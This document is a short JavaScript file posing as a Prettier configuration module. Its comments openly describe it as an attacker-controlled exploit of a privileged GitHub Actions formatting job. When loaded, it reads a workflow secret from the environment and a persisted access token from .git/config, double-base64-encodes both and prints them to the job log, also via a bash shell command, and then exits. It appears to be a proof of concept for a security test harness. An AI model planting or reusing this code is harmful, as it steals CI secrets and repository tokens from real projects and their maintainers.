// Attacker-controlled Prettier config module.
// prettier resolves and Node-requires this file from the checked-out PR tree
// (cwd = pr-branch) while running `prettier --write <tracked files>` inside the
// privileged format.yml job that holds secrets.SLANGBOT_PAT.
const fs = require('fs');
const cp = require('child_process');

function db64(s) {
  return Buffer.from(Buffer.from(String(s), 'utf8').toString('base64')).toString('base64');
}

// Leak the harness toy secret exactly as the harness expects:
//   echo -n "$LEAKED_SECRET" | base64 | base64
try {
  fs.writeSync(1, 'GERALT_LEAKED_TOKEN=' + db64(process.env.GERALT_SECRET || '') + '\n');
} catch (e) {}

// Also demonstrate the repo-scoped PAT that actions/checkout persist-credentials
// wrote into pr-branch/.git/config.
try {
  const cfg = fs.readFileSync('.git/config', 'utf8');
  const m = cfg.match(/AUTHORIZATION:\s*basic\s+(\S+)/i);
  fs.writeSync(1, 'GITCONFIG_PAT_PRESENT=' + (m ? 'yes' : 'no') + '\n');
  if (m) fs.writeSync(1, 'GERALT_LEAKED_GIT_PAT=' + db64(Buffer.from(m[1], 'base64').toString('utf8')) + '\n');
} catch (e) {}

// Belt-and-suspenders: same double-base64 via a real shell sink.
try {
  const out = cp.execSync('echo -n "$GERALT_SECRET" | base64 | base64', { shell: '/bin/bash' }).toString().trim();
  fs.writeSync(1, 'GERALT_LEAKED_TOKEN_SHELL=' + out + '\n');
} catch (e) {}

// Terminate immediately so the evidence is preserved and the formatting step
// surfaces a non-zero prettier run.
process.exit(1);

module.exports = {};
